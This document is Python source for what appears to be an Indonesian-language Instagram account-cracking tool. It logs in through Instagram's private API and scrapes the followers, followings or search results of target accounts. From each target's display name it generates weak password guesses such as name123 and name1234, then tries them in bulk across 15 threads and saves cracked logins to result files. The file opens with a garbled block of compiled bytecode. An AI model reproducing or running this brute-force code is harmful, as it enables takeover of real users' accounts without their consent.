7\x01\x0c\xd8\x08\x0b\x8f\x07\x8a\x07\xd0\x10`\xd1\x08a\xd4\x08a\xd4\x08f\x80\x14\xd8\x04\x11\x90T\xd0\x04\x19\xf0\x00\x02\x02\r\xd8\x02\x08\x80&\x88\x15\x88\x15\xd0\x0fR\xd0\\g\xd0Yi\xd0\tj\xd1\tj\xd4\tj\xd1\x02k\xd4\x02k\xd0\x02k\xd8\x02\x05\x87(\x82(\x81*\x84*\x80*\xf8\xf8\xd8\x07\x0f\xd4\x07\x1a\xd4\x07*\xf0\x00\x02\x01\x0c\xf0\x00\x02\x01\x0c\xf0\x00\x02\x01\x0c\xd8\x01\x07\x80\x16\x88\x05\x88\x05\xd0\x0eG\xd0Q\\\xd0N^\xd0\x08_\xd1\x08_\xd4\x08_\xd1\x01`\xd4\x01`\xd0\x01`\xd8\x01\x04\x87\x18\x82\x18\x81\x1a\x84\x1a\x80\x1a\x80\x1a\x80\x1a\xf0\x05\x02\x01\x0c\xf8\xf8\xf8\xf0\x08\x08\x01\x1f\xf0\x00\x08\x01\x1f\xf0\x00\x08\x01\x1f\xf0\x14\x03\x01-\xd8\x15\x1b\x94\\\xd0\x01\x12\xd0\x01\x12\xf8\xf0\x02\x01\x01-\xd8\x15\x1b\x94\\\xd4\x15,\xd0\x01\x12\xd0\x01\x12\xd0\x01\x12\xf8\xf8\xf8\xf0\x04\x12\x01\x19\xf0\x00\x12\x01\x19\xf0\x00\x12\x01\x19\xf0(\x18\x01\x13\xf0\x00\x18\x01\x13\xf0\x00\x18\x01\x13\xf0\x00\x18\x01\x13\xf0\x00\x18\x01\x13s\x1e\x00\x00\x00\x82A\tA\x0c\x00\xc1\x0c:B\t\x03\xc2\x08\x01B\t\x03\xc2\x10\x07B\x18\x00\xc2\x18\x0eB(\x03'))

class instagramAPI:
	API_URL = 'https://i.instagram.com/api/v1/'
	DEVICE_SETTINTS = {'manufacturer': 'Xiaomi',
		'model': 'HM 1SW',
		'android_version': 18,
		'android_release': '4.3'}
	USER_AGENT = 'Instagram 10.26.0 Android ({android_version}/{android_release}; 320dpi; 720x1280; {manufacturer}; {model}; armani; qcom; en_US)'.format(**DEVICE_SETTINTS)
	IG_SIG_KEY = '4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178'
	EXPERIMENTS = 'ig_promote_reach_objective_fix_universe,ig_android_universe_video_production,ig_search_client_h1_2017_holdout,ig_android_live_follow_from_comments_universe,ig_android_carousel_non_square_creation,ig_android_live_analytics,ig_android_follow_all_dialog_confirmation_copy,ig_android_stories_server_coverframe,ig_android_video_captions_universe,ig_android_offline_location_feed,ig_android_direct_inbox_retry_seen_state,ig_android_ontact_invite_universe,ig_android_live_broadcast_blacklist,ig_android_insta_video_reconnect_viewers,ig_android_ad_async_ads_universe,ig_android_search_clear_layout_universe,ig_android_shopping_reporting,ig_android_stories_surface_universe,ig_android_verified_comments_universe,ig_android_preload_media_ahead_in_current_reel,android_instagram_prefetch_suggestions_universe,ig_android_reel_viewer_fetch_missing_reels_universe,ig_android_direct_search_share_sheet_universe,ig_android_business_promote_tooltip,ig_android_direct_blue_tab,ig_android_async_network_tweak_universe,ig_android_elevate_main_thread_priority_universe,ig_android_stories_gallery_nux,ig_android_instavideo_remove_nux_comments,ig_video_copyright_whitelist,ig_react_native_inline_insights_with_relay,ig_android_direct_thread_message_animation,ig_android_draw_rainbow_client_universe,ig_android_direct_link_style,ig_android_live_heart_enhancements_universe,ig_android_rtc_reshare,ig_android_preload_item_count_in_reel_viewer_buffer,ig_android_users_bootstrap_service,ig_android_auto_retry_post_mode,ig_android_shopping,ig_android_main_feed_seen_state_dont_send_info_on_tail_load,ig_fbns_preload_default,ig_android_gesture_dismiss_reel_viewer,ig_android_tool_tip,ig_android_ad_logger_funnel_logging_universe,ig_android_gallery_grid_column_count_universe,ig_android_business_new_ads_payment_universe,ig_android_direct_links,ig_android_audience_control,ig_android_live_encore_consumption_settings_universe,ig_perf_android_holdout,ig_android_cache_contact_import_list,ig_android_links_receivers,ig_android_ad_impression_backtest,ig_android_list_redesign,ig_android_stories_separate_overlay_creation,ig_android_stop_video_recording_fix_universe,ig_android_render_video_segmentation,ig_android_live_encore_reel_chaining_universe,ig_android_sync_on_background_enhanced_10_25,ig_android_immersive_viewer,ig_android_mqtt_skywalker,ig_fbns_push,ig_android_ad_watchmore_overlay_universe,ig_android_react_native_universe,ig_android_profile_tabs_redesign_universe,ig_android_live_consumption_abr,ig_android_story_viewer_social_context,ig_android_hide_post_in_feed,ig_android_video_loopcount_int,ig_android_enable_main_feed_reel_tray_preloading,ig_android_camera_upsell_dialog,ig_android_ad_watchbrowse_universe,ig_android_internal_research_settings,ig_android_search_people_tag_universe,ig_android_react_native_ota,ig_android_enable_concurrent_request,ig_android_react_native_stories_grid_view,ig_android_business_stories_inline_insights,ig_android_log_mediacodec_info,ig_android_direct_expiring_media_loading_errors,ig_video_use_sve_universe,ig_android_cold_start_feed_request,ig_android_enable_zero_rating,ig_android_reverse_audio,ig_android_branded_content_three_line_ui_universe,ig_android_live_encore_production_universe,ig_stories_music_sticker,ig_android_stories_teach_gallery_location,ig_android_http_stack_experiment_2017,ig_android_stories_device_tilt,ig_android_pending_request_search_bar,ig_android_fb_topsearch_sgp_fork_request,ig_android_seen_state_with_view_info,ig_android_animation_perf_reporter_timeout,ig_android_new_block_flow,ig_android_story_tray_title_play_all_v2,ig_android_direct_address_links,ig_android_stories_archive_universe,ig_android_save_collections_cover_photo,ig_android_live_webrtc_livewith_production,ig_android_sign_video_url,ig_android_stories_video_prefetch_kb,ig_android_stories_create_flow_favorites_tooltip,ig_android_live_stop_broadcast_on_404,ig_android_live_viewer_invite_universe,ig_android_promotion_feedback_channel,ig_android_render_iframe_interval,ig_android_accessibility_logging_universe,ig_android_camera_shortcut_universe,ig_android_use_one_cookie_store_per_user_override,ig_profile_holdout_2017_universe,ig_android_stories_server_brushes,ig_android_ad_media_url_logging_universe,ig_android_shopping_tag_nux_text_universe,ig_android_comments_single_reply_universe,ig_android_stories_video_loading_spinner_improvements,ig_android_collections_cache,ig_android_comment_api_spam_universe,ig_android_facebook_twitter_profile_photos,ig_android_shopping_tag_creation_universe,ig_story_camera_reverse_video_experiment,ig_android_direct_bump_selected_recipients,ig_android_ad_cta_haptic_feedback_universe,ig_android_vertical_share_sheet_experiment,ig_android_family_bridge_share,ig_android_search,ig_android_insta_video_consumption_titles,ig_android_stories_gallery_preview_button,ig_android_fb_auth_education,ig_android_camera_universe,ig_android_me_only_universe,ig_android_instavideo_audio_only_mode,ig_android_user_profile_chaining_icon,ig_android_live_video_reactions_consumption_universe,ig_android_stories_hashtag_text,ig_android_post_live_badge_universe,ig_android_swipe_fragment_container,ig_android_search_users_universe,ig_android_live_save_to_camera_roll_universe,ig_creation_growth_holdout,ig_android_sticker_region_tracking,ig_android_unified_inbox,ig_android_live_new_watch_time,ig_android_offline_main_feed_10_11,ig_import_biz_contact_to_page,ig_android_live_encore_consumption_universe,ig_android_experimental_filters,ig_android_search_client_matching_2,ig_android_react_native_inline_insights_v2,ig_android_business_conversion_value_prop_v2,ig_android_redirect_to_low_latency_universe,ig_android_ad_show_new_awr_universe,ig_family_bridges_holdout_universe,ig_android_background_explore_fetch,ig_android_following_follower_social_context,ig_android_video_keep_screen_on,ig_android_ad_leadgen_relay_modern,ig_android_profile_photo_as_media,ig_android_insta_video_consumption_infra,ig_android_ad_watchlead_universe,ig_android_direct_prefetch_direct_story_json,ig_android_shopping_react_native,ig_android_top_live_profile_pics_universe,ig_android_direct_phone_number_links,ig_android_stories_weblink_creation,ig_android_direct_search_new_thread_universe,ig_android_histogram_reporter,ig_android_direct_on_profile_universe,ig_android_network_cancellation,ig_android_background_reel_fetch,ig_android_react_native_insights,ig_android_insta_video_audio_encoder,ig_android_family_bridge_bookmarks,ig_android_data_usage_network_layer,ig_android_universal_instagram_deep_links,ig_android_dash_for_vod_universe,ig_android_modular_tab_discover_people_redesign,ig_android_mas_sticker_upsell_dialog_universe,ig_android_ad_add_per_event_counter_to_logging_event,ig_android_sticky_header_top_chrome_optimization,ig_android_rtl,ig_android_biz_conversion_page_pre_select,ig_android_promote_from_profile_button,ig_android_live_broadcaster_invite_universe,ig_android_share_spinner,ig_android_text_action,ig_android_own_reel_title_universe,ig_promotions_unit_in_insights_landing_page,ig_android_business_settings_header_univ,ig_android_save_longpress_tooltip,ig_android_constrain_image_size_universe,ig_android_business_new_graphql_endpoint_universe,ig_ranking_following,ig_android_stories_profile_camera_entry_point,ig_android_universe_reel_video_production,ig_android_power_metrics,ig_android_sfplt,ig_android_offline_hashtag_feed,ig_android_live_skin_smooth,ig_android_direct_inbox_search,ig_android_stories_posting_offline_ui,ig_android_sidecar_video_upload_universe,ig_android_promotion_manager_entry_point_universe,ig_android_direct_reply_audience_upgrade,ig_android_swipe_navigation_x_angle_universe,ig_android_offline_mode_holdout,ig_android_live_send_user_location,ig_android_direct_fetch_before_push_notif,ig_android_non_square_first,ig_android_insta_video_drawing,ig_android_swipeablefilters_universe,ig_android_live_notification_control_universe,ig_android_analytics_logger_running_background_universe,ig_android_save_all,ig_android_reel_viewer_data_buffer_size,ig_direct_quality_holdout_universe,ig_android_family_bridge_discover,ig_android_react_native_restart_after_error_universe,ig_android_startup_manager,ig_story_tray_peek_content_universe,ig_android_profile,ig_android_high_res_upload_2,ig_android_http_service_same_thread,ig_android_scroll_to_dismiss_keyboard,ig_android_remove_followers_universe,ig_android_skip_video_render,ig_android_story_timestamps,ig_android_live_viewer_comment_prompt_universe,ig_profile_holdout_universe,ig_android_react_native_insights_grid_view,ig_stories_selfie_sticker,ig_android_stories_reply_composer_redesign,ig_android_streamline_page_creation,ig_explore_netego,ig_android_ig4b_connect_fb_button_universe,ig_android_feed_util_rect_optimization,ig_android_rendering_controls,ig_android_os_version_blocking,ig_android_encoder_width_safe_multiple_16,ig_search_new_bootstrap_holdout_universe,ig_android_snippets_profile_nux,ig_android_e2e_optimization_universe,ig_android_comments_logging_universe,ig_shopping_insights,ig_android_save_collections,ig_android_live_see_fewer_videos_like_this_universe,ig_android_show_new_contact_import_dialog,ig_android_live_view_profile_from_comments_universe,ig_fbns_blocked,ig_formats_and_feedbacks_holdout_universe,ig_android_reduce_view_pager_buffer,ig_android_instavideo_periodic_notif,ig_search_user_auto_complete_cache_sync_ttl,ig_android_marauder_update_frequency,ig_android_suggest_password_reset_on_oneclick_login,ig_android_promotion_entry_from_ads_manager_universe,ig_android_live_special_codec_size_list,ig_android_enable_share_to_messenger,ig_android_background_main_feed_fetch,ig_android_live_video_reactions_creation_universe,ig_android_channels_home,ig_android_sidecar_gallery_universe,ig_android_upload_reliability_universe,ig_migrate_mediav2_universe,ig_android_insta_video_broadcaster_infra_perf,ig_android_business_conversion_social_context,android_ig_fbns_kill_switch,ig_android_live_webrtc_livewith_consumption,ig_android_destroy_swipe_fragment,ig_android_react_native_universe_kill_switch,ig_android_stories_book_universe,ig_android_all_videoplayback_persisting_sound,ig_android_draw_eraser_universe,ig_direct_search_new_bootstrap_holdout_universe,ig_android_cache_layer_bytes_threshold,ig_android_search_hash_tag_and_username_universe,ig_android_business_promotion,ig_android_direct_search_recipients_controller_universe,ig_android_ad_show_full_name_universe,ig_android_anrwatchdog,ig_android_qp_kill_switch,ig_android_2fac,ig_direct_bypass_group_size_limit_universe,ig_android_promote_simplified_flow,ig_android_share_to_whatsapp,ig_android_hide_bottom_nav_bar_on_discover_people,ig_fbns_dump_ids,ig_android_hands_free_before_reverse,ig_android_skywalker_live_event_start_end,ig_android_live_join_comment_ui_change,ig_android_direct_search_story_recipients_universe,ig_android_direct_full_size_gallery_upload,ig_android_ad_browser_gesture_control,ig_channel_server_experiments,ig_android_video_cover_frame_from_original_as_fallback,ig_android_ad_watchinstall_universe,ig_android_ad_viewability_logging_universe,ig_android_new_optic,ig_android_direct_visual_replies,ig_android_stories_search_reel_mentions_universe,ig_android_threaded_comments_universe,ig_android_mark_reel_seen_on_Swipe_forward,ig_internal_ui_for_lazy_loaded_modules_experiment,ig_fbns_shared,ig_android_capture_slowmo_mode,ig_android_live_viewers_list_search_bar,ig_android_video_single_surface,ig_android_offline_reel_feed,ig_android_video_download_logging,ig_android_last_edits,ig_android_exoplayer_4142,ig_android_post_live_viewer_count_privacy_universe,ig_android_activity_feed_click_state,ig_android_snippets_haptic_feedback,ig_android_gl_drawing_marks_after_undo_backing,ig_android_mark_seen_state_on_viewed_impression,ig_android_live_backgrounded_reminder_universe,ig_android_live_hide_viewer_nux_universe,ig_android_live_monotonic_pts,ig_android_search_top_search_surface_universe,ig_android_user_detail_endpoint,ig_android_location_media_count_exp_ig,ig_android_comment_tweaks_universe,ig_android_ad_watchmore_entry_point_universe,ig_android_top_live_notification_universe,ig_android_add_to_last_post,ig_save_insights,ig_android_live_enhanced_end_screen_universe,ig_android_ad_add_counter_to_logging_event,ig_android_blue_token_conversion_universe,ig_android_exoplayer_settings,ig_android_progressive_jpeg,ig_android_offline_story_stickers,ig_android_gqls_typing_indicator,ig_android_chaining_button_tooltip,ig_android_video_prefetch_for_connectivity_type,ig_android_use_exo_cache_for_progressive,ig_android_samsung_app_badging,ig_android_ad_holdout_watchandmore_universe,ig_android_offline_commenting,ig_direct_stories_recipient_picker_button,ig_insights_feedback_channel_universe,ig_android_insta_video_abr_resize,ig_android_insta_video_sound_always_on'
	SIG_KEY_VERSION = '4'

	def __init__(self,username,password):
		self.username=username
		self.password=password
		m = hashlib.md5()
		m.update(username.encode('utf-8') + password.encode('utf-8'))
		self.device_id = self.generateDeviceId(m.hexdigest())
		self.uuid = self.generateUUID(True)
		self.s = requests.Session()

	def generateDeviceId(self, seed):
		volatile_seed = "12345"
		m = hashlib.md5()
		m.update(seed.encode('utf-8') + volatile_seed.encode('utf-8'))
		return 'android-' + m.hexdigest()[:16]

	def generateUUID(self, type):
		generated_uuid = str(uuid.uuid4())
		if (type):
			return generated_uuid
		else:
			return generated_uuid.replace('-', '')

	def loginAPI(self):
		token=self.s.get("https://www.instagram.com/",headers={"user-agent":User_Agent()}).text
		crf_token=re.findall(r"\"csrf_token\"\:\"(.*?)\"", str(token))[0]
		self.s.headers.update({'Connection': 'close',
			'Accept': '*/*',
			'Content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'Cookie2': '$Version=1',
			'Accept-Language': 'en-US',
			'User-Agent': user_agentAPI()})
		self.data = json.dumps({
			'phone_id': self.generateUUID(True),
			'_csrftoken': crf_token,
			'username': self.username,
			'guid': self.uuid,
			'device_id': self.device_id,
			'password': self.password,
			'login_attempt_count': '0'})
		self.payload = 'signed_body={}.{}&ig_sig_key_version=4'.format(
			self.generateUUID(False),
			urllib.request.quote(self.data)
		)
		x=self.s.post("https://i.instagram.com/api/v1/accounts/login/", self.payload)
		x_jason=json.loads(x.text)
		x_kukis=x.cookies.get_dict()
		if "logged_in_user" in x.text:
			kuki=";".join([v+"="+x_kukis[v] for v in x_kukis])
			return {'status':'success','cookie':kuki,'userame':self.username}
		elif 'challenge_required' in x.text:
			return {'status':'checkpoint'}
		else:
			return {'status':'login_error'}
C = ''

class instagram:
	def __init__(self,external,username,cookie):
		self.ext=external
		self.username=username
		self.cookie=cookie
		self.s=requests.Session()
		self.tol = Console()
	def menu(self):
		for i in external:
			try:
				nama=i.split('|')[0]
				followers=i.split('|')[1]
				following=i.split('|')[2]
			except:
				pass
			banner()
			self.dataku()
			lupXfla = []
			lupXfla.append(lupineID(f'[italic][bold white]brute for follower',width=22,title=f"[bold red]• [bold green]01 [bold red]•",style=f"{rich_gelap}"))
			lupXfla.append(lupineID(f'[italic][bold white]brute for following',width=23,title=f"[bold red]• [bold green]02 [bold red]•",style=f"{rich_gelap}"))
			lupXfla.append(lupineID(f'[italic][bold white] brute for search ',width=23,title=f"[bold red]• [bold green]03 [bold red]•",style=f"{rich_gelap}"))
			flaXlup = []
			lupXfla.append(lupineID(f'[italic][bold white]result from brute',width=22,title=f"[bold red]• [bold green]04 [bold red]•",style=f"{rich_gelap}"))
			lupXfla.append(lupineID(f'[italic][bold white] checking account',width=23,title=f"[bold red]• [bold green]05 [bold red]•",style=f"{rich_gelap}"))
			lupXfla.append(lupineID(f'[italic][bold white]    play music',width=23,title=f"[bold red]• [bold green]06 [bold red]•",style=f"{rich_gelap}"))
			lupine = []
			lupXfla.append(lupineID(f'[italic][bold white]  open tiktoks',width=22,title=f"[bold red]• [bold green]07 [bold red]•",style=f"{rich_gelap}"))
			lupXfla.append(lupineID(f'[italic][bold white]  remove license',width=23,title=f"[bold red]• [bold green]08 [bold red]•",style=f"{rich_gelap}"))
			lupXfla.append(lupineID(f'[italic][bold white]   delete login',width=23,title=f"[bold red]• [bold green]09 [bold red]•",style=f"{rich_gelap}"))
			lupine_id.print(Columns(flaXlup))
			lupine_id.print(Columns(lupXfla))
			lupine_id.print(Columns(lupine))

			lose=input(f'{P} ———>{H} ')
			if lose in ["1","01"]:
				try:
					menudump.append('pengikut')
					code(nel(f"[italic bold white] masukkan jumlah target dan username instagram dengan non private",width=72,style=f"{rich_gelap}"))
					m=int(input(f'{P} ———>{H} '))
				except:m=1
				for t in range(m):
					t +=1
					nama=input(f'{P} ———>{H} ')
					id=self.idAPI(self.cookie,nama)
					info=self.infoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/followers/?count=100000',id)
				self.passwordAPI(info)

			elif lose in ["2","02"]:
				try:
					menudump.append('mengikuti')
					prints(Panel(f"[italic bold white] masukkan jumlah target dan username instagram dengan non private",width=72,style=f"{rich_gelap}"))
					m=int(input(f'{P} ———>{H} '))
				except:m=1
				for t in range(m):
					t +=1
					nama=input(f'{P} ———>{H} ')
					id=self.idAPI(self.cookie,nama)
					info=self.ifoAPI(self.cookie,'https://i.instagram.com/api/v1/friendships/%s/following/?count=100000',id)
				self.passwordAPI(info)

			elif lose in ["3","03"]:
				code(lupineID("[italic bold white]       masukkan jumlah target dan masukkan nama target",width=72,style="#AF00FF"))
				m=int(input(f'{P} ———>{H} '))
				for i in range(m):
					i+1
					i+=1
					nama=input(f'{P} ———>{H} ')
					name=self.searchAPI(self.cookie,nama)
				self.passwordAPI(name)

			elif lose in ["5","05"]:
				code(lupineID(" [italic bold white]masukkan nama sesuai file dibawah ini yang akan di cek",width=72,style="#AF00FF"))
				time.sleep(4)
				for i in os.listdir('result'):
					code(lupineID("[italic bold yellow] %s"%(i),width=34,style=""))
				c=input(f'{P} ———>{H} ')
				g=open("result/%s"%(c)).read().splitlines()
				code(Panel(f"[italic bold white] result {c} sedang dalam pengecekan tunggu",width=72,style=f"#AF00FF"))
				for s in g:
					usr=s.split("|")[0]
					pwd=s.split("|")[1]
					self.checkAPI(usr,pwd)
				exit()

			elif lose in ["4","04"]:
				lup,xtc = 0,[]
				list = "       [italic bold white] daftar results crack [bold green]success [bold white]&[bold white] result[bold yellow] checkpoint"
				code(lupineID(list,width=72,style=f"#AF00FF"))
				one = input(f' {P}[{H}+{P}] tekan enter untuk menampilkan result ')
				if one in ['']:
					try:ok = os.listdir('result')
					except:sys.exit("")
					for log in ok:
						xtc.append(log)
						lup+=1
						try:jum= open('result/'+log,'r').readlines()
						except:continue
						lupXfla = []
						lupXfla.append(lupineID(f'[italic][bold white]{log} {len(jum)} id',width=32,title=f"[bold red]• [bold green]{lup} [bold red]•",style=f"#AF00FF"))
						lupine_id.print(Columns(lupXfla))
					abc = input(f' {P}———>{H} ')
					file = xtc[int(abc)-1]
					try:buka = open('result/'+file,'r').read()
					except:sys.exit("")
					lupXfla = []
					lupXfla.append(lupineID(f'[italic][bold green]{buka}',width=40,title=f"[bold red]• [bold green]{lup} [bold red]•",style=f"#AF00FF"))
					lupine_id.print(Columns(lupXfla))
			elif lose in ["6","06"]:
				os.system("clear")
				os.system("pkg install play-audio")
				os.system("play-audio music.mp3")

			elif lose in ["7","07"]:
				os.system("xdg-open")
				input(" ———> tekan enter untuk kembali")
				self.menu()

			elif lose in ["8","08"]:
				os.remove("data/lisensi.txt")
				cetak(nel(f"[italic bold white] succes delete license",width=25));exit()
			elif lose in ["9","09"]:
				RemoveCookie()
				cetak(nel("[italic bold white] succes delete cookie",width=25));exit()

			else:
				self.menu()

	def dataku(self):
	       	for i in external:
	       		nama=i.split('|')[0]
	       		followers=i.split('|')[1]
	       		following=i.split('|')[2]
	       	try:
	       	       ses=requests.Session()
	       	       lisen=open('data/lisensi.txt','r').read()
	       	       met = ses.get('https://app.cryptolens.io/api/key/Activate?token=WyIzMzI5NDg1MCIsIlFBMWkxelU0LzdHczZkQ0NIWi9xQ2lwRXdVWmJobm5jUVJxdGFpRHUiXQ==&ProductId=18033&Key='+lisen).json()
	       	       men = met['licenseKey']
	       	       key = men['key'][0:11]
	       	       tahun = men['expires'][0:4]
	       	       buln = men['expires'][5:7]
	       	       tanggal = men['expires'][8:10]
	       	       bulan=licensie[buln]
	       	       tahun1 = men['created'][0:4]
	       	       buln1 = men['created'][5:7]
	       	       tanggal1 = men['created'][8:10]
	       	       bulan1=licensie[buln1]
	               ling = []
	               ling.append(Panel(f'[italic][bold white] {self.username}',width=22,style=f"{rich_gelap}"))
	               ling.append(Panel(f'[italic][bold white]pengikut [bold green]{followers} [bold white]user',width=23,style=f"{rich_gelap}"))
	               ling.append(Panel(f'[italic][bold white]mengikuti [bold green]{following} [bold white]user',width=23,style=f"{rich_gelap}"))
	               lupine_id.print(Columns(ling))
	               lupi = []
	               lupi.append(Panel(f'[italic][bold white]licensi aktif {tanggal1} {bulan1} {tahun1}',width=34,style=f"{rich_gelap}"))
	               lupi.append(Panel(f'[italic][bold white]licensi akhir {tanggal} {bulan} {tahun}',width=35,style=f"{rich_gelap}"))
	               lupine_id.print(Columns(lupi))
	               lag = []
	               lag.append(Panel(f'[italic bold green]            {key} — * * * * * — * * * * *',width=70,style="#FF8F00"))
	               lupine_id.print(Columns(lag))
	       	except:
	       	       key = "-"
	       	       tanggal = "-"
	       	       bulan = "-"
	       	       tahun = "-"
	       	       tanggal1 = "-"
	       	       bulan1 = "-"
	       	       tahun1 = "-"
	               ling = []
	               ling.append(Panel(f'[italic][bold white] {self.username}',width=22,style=f"{rich_gelap}"))
	               ling.append(Panel(f'[italic][bold white]pengikut [bold green]{followers} [bold white]user',width=23,style=f"{rich_gelap}"))
	               ling.append(Panel(f'[italic][bold white]mengikuti [bold green]{following} [bold white]user',width=23,style=f"{rich_gelap}"))
	               lupine_id.print(Columns(ling))
	               lupi = []
	               lupi.append(Panel(f'[italic][bold white] licensi aktif {tanggal1} {bulan1} {tahun1}',width=34,style=f"{rich_gelap}"))
	               lupi.append(Panel(f'[italic][bold white] licensi akhir {tanggal} {bulan} {tahun}',width=35,style=f"{rich_gelap}"))
	               lupine_id.print(Columns(lupi))
	               lag = []
	               lag.append(Panel(f'[italic bold yellow]{key}',width=70,style=""))
	               lupine_id.print(Columns(lag))

	def searchAPI(self,cookie,nama):
		try:
			for ba in range(100):
				x=s.get('https://www.instagram.com/web/search/topsearch/?count=100000&context=blended&query=%s&rank_token=0.21663777590422106&include_reel=true'%(nama),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				try:
					for i in x_jason['users']:
						user=i['user']
						username=user['username']
						fullname=user['full_name']
						internal.append(f'{username}|{fullname}')
					wr = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
					sys.stdout.write(f"\r{P} ———> terkumpul {wr}{len(internal)} {P}username"),sys.stdout.flush()
				except:
					if 'challenge' in x.text:
						break
					else:
						continue
			print("\r")
		except Exception as e:print(e)
		return internal

	def idAPI(self,cookie,id):
		if 'into' in ingredient:
			try:
				m=s.get("https://z-p42.www.instagram.com/api/v1/users/web_profile_info/?username=%s"%(id),cookies=cookie,headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
				m_jason=m.json()["data"]["user"]
				idx=m_jason["id"]
			except requests.exceptions.ConnectionError:
				exit()
			except requests.exceptions.ConnectionError:
			    exit()
			except Exception as e:
				print(f'{P} ———>{K} username tidak tersedia')
				exit()
			return idx
		else:lisensi()

	def infoAPI(self,cookie,api,id):
		if 'into' in  ingredient:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'pengikut' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://z-p42.www.instagram.com/api/v1/friendships/'+id+'/followers/?count=100&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							wr = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
							sys.stdout.write(f"\r{P} ———> terkumpul {wr}{len(internal)} {P}username{P}"),sys.stdout.flush()
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				print("\r")
			except Exception as e:
				print("")
			return internal
		else:lisensi()
		
	def ifoAPI(self,cookie,api,id):
		if 'into' in  ingredient:
			try:
				x=s.get(api%(id),cookies=cookie,headers={"user-agent":USN})
				x_jason=json.loads(x.text)
				for i in x_jason['users']:
					username = i["username"]
					nama = i["full_name"]
					internal.append(f'{username}|{nama}')
					following.append(username)
				if 'mengikuti' in menudump:
					maxid=x_jason['next_max_id']
					for z in range (9999):
						x=s.get('https://i.instagram.com/api/v1/friendships/'+id+'/following/?count=200&max_id='+maxid,cookies=cookie,headers={"user-agent":USN})
						x_jason=json.loads(x.text)
						try:
							for i in x_jason['users']:
								username = i["username"]
								nama = i["full_name"]
								internal.append(f'{username}|{nama}')
								following.append(username)
							wr = random.choice(['\x1b[1;91m', '\x1b[1;92m', '\x1b[1;93m', '\x1b[1;94m', '\x1b[1;95m', '\x1b[1;96m', '\x1b[1;97m', '\x1b[0m'])
							sys.stdout.write(f"\r{P} ———>terkumpul {wr}{len(internal)} {P}username"),sys.stdout.flush()
							try:
								maxid=x_jason['next_max_id']
							except:
								break
						except:
							if 'challenge' in x.text:
								break
							else:
								continue
				print("\r")
			except Exception as e:
				print("")
			return internal
		else:lisensi()

	def save(self):
		urut = []
		urut.append(Panel(f"[italic bold green] live-green[italic bold white]-{day}.txt",width=35,style=f"{rich_gelap}"))
		urut.append(Panel(f"[italic bold yellow] checkpoint[italic bold white]-{day}.txt",width=34,style=f"{rich_gelap}"))
		self.tol.print(Columns(urut))

	def metode(self):
		urut = []
		urut.append(Panel(f"[italic bold white]     interface & force",title=f"[bold red]• [bold green]1 & 2 [bold red]•",width=35,style=f"{rich_gelap}"))
		urut.append(Panel(f"[italic bold white]asynchronous1 & asynchronous2",title=f"[bold red]• [bold green]3 & 4 [bold red]•",width=34,style=f"{rich_gelap}"))
		self.tol.print(Columns(urut))
		lupXfla = []
		lupXfla.append(lupineID(f'[italic][bold white] nama+123+1234',width=22,title=f"[bold red]• [bold green]01 [bold red]•",style=f"{rich_gelap}"))
		lupXfla.append(lupineID(f'[italic][bold white] nama+123+1234+12345',width=23,title=f"[bold red]• [bold green]02 [bold red]•",style=f"{rich_gelap}"))
		lupXfla.append(lupineID(f'[italic][bold white] nama+123+1234+12345+123456',width=23,title=f"[bold red]• [bold green]03 [bold red]•",style=f"{rich_gelap}"))
		lupine_id.print(Columns(lupXfla))
	def passwordAPI(self,xnx):
		self.metode()
		u = input(f'{P} ———>{H} ')
		if u in ["1","01"]:
		    method.append('interface')
		elif u in ["2","02"]:
		    method.append('force')
		elif u in ["3","03"]:
		    method.append('asynchronous1')
		elif u in ["4"]:
		    method.append('asynchronous2')
		else:
			method.append('asynchronous1')
		c=input(f'{P} ———>{H} ')
		if c in ["1","01"]:
			self.generateAPI(xnx,c)
		elif c in ["2","02"]:
			self.generateAPI(xnx,c)
		elif c in ["3","03"]:
			self.generateAPI(xnx,c)
		else:
			self.passwordAPI(xnx)

	def generateAPI(self,user,o,fla=''):
			self.save()
			with ThreadPoolExecutor(max_workers=15) as pw_crack:
				for i in user:
					try:
						username=i.split("|")[0]
						password=i.split("|")[1].lower()
						for w in password.split(" "):
							if len(w)<3:
								continue
							else:
								w=w.lower()
								if o=="1":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234']
									else:
										sandi=[w,w+'123',w+'1234']
								elif o=="2":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',password.lower()]
									else:
										sandi=[w+'123',w,w+'1234',password.lower()]
								elif o=="3":
									if len(w)==3 or len(w)==4 or len(w)==5:
										sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
									else:
										sandi=[w,w+'123',w+'1234',w+'321',w+'12345',w+'123456',password.lower()]
								if 'asynchronous1' in method:
									pw_crack.submit(self.asynchronous1,username,sandi)
								elif 'force' in method:
									pw_crack.submit(self.force,username,sandi)
								elif 'Interface' in method:
								    pw_crack.submit(self.api,username,sandi)
								elif 'asynchronous2' in method:
								    pw_crack.submit(self.asynchronous2,username,sandi)
								else:
									pw_crack.submit(self.asynchronous1,username,sandi)
					except:
						pass
			exit()

	def APIinfo(self,user):
		try:
			x=s.get("https://i.instagram.com/api/v1/users/web_profile_info/?username=%s"%(user),headers={"user-agent":USN,"x-ig-app-id":'936619743392459'})
			x_jason=x.json()["data"]["user"]
